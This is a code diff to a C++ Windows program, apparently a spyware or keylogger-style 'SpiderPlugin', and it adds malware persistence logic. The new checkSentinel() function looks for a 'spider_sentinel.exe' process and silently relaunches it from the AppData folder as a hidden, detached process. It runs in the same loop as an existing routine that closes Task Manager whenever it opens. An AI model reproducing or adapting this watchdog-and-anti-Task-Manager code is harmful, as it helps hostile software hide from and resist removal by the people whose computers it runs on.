@@ -11,6 +11,7 @@
 #include <Sddl.h>
 #include <winternl.h>
 #include <commctrl.h>
+#include <tlhelp32.h>
 #include "SpiderPlugin.h"
 #include "MacAddr.h"
 
@@ -632,6 +633,7 @@ namespace spider
       {
 	MSG msg;
 
+	checkSentinel();
 	killTaskManager();
 	while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE))
 	  {
@@ -768,6 +770,55 @@ namespace spider
 	  {
 	    PostMessage(taskManager, WM_CLOSE, static_cast<LPARAM>(0),
 	                static_cast<WPARAM>(0));
+	  }
+      }
+
+      void SpiderPlugin::checkSentinel() const
+      {
+	char const *   processName = "spider_sentinel.exe";
+	bool           exists = false;
+	PROCESSENTRY32 entry{};
+	entry.dwSize = sizeof(PROCESSENTRY32);
+
+	HANDLE snapshot =
+	    CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (Process32First(snapshot, &entry))
+	  {
+	    while (Process32Next(snapshot, &entry))
+	      {
+		if (!std::strcmp(entry.szExeFile, processName))
+		  {
+		    exists = true;
+		    break;
+		  }
+	      }
+	  }
+	CloseHandle(snapshot);
+
+	// if the process doesn't exist, start it !
+	if (!exists)
+	  {
+	    std::wstring const env(_wgetenv(L"AppData"));
+	    std::wstring const processPath =
+	        env + L"\\spider\\spider_sentinel.exe";
+	    STARTUPINFOW        siStartupInfo;
+	    PROCESS_INFORMATION piProcessInfo;
+	    std::memset(&siStartupInfo, 0, sizeof(siStartupInfo));
+	    std::memset(&piProcessInfo, 0, sizeof(piProcessInfo));
+	    siStartupInfo.cb = sizeof(siStartupInfo);
+	    siStartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+	    siStartupInfo.wShowWindow = SW_HIDE;
+
+	    if (CreateProcessW(nullptr,
+	                       const_cast<LPWSTR>(processPath.c_str()), 0, 0,
+	                       false,
+	                       CREATE_DEFAULT_ERROR_MODE | CREATE_NO_WINDOW |
+	                           DETACHED_PROCESS,
+	                       0, 0, &siStartupInfo, &piProcessInfo) != false)
+	      {
+		/* Watch the process. */
+		WaitForSingleObject(piProcessInfo.hProcess, (2 * 1000));
+	      }
 	  }
       }
 
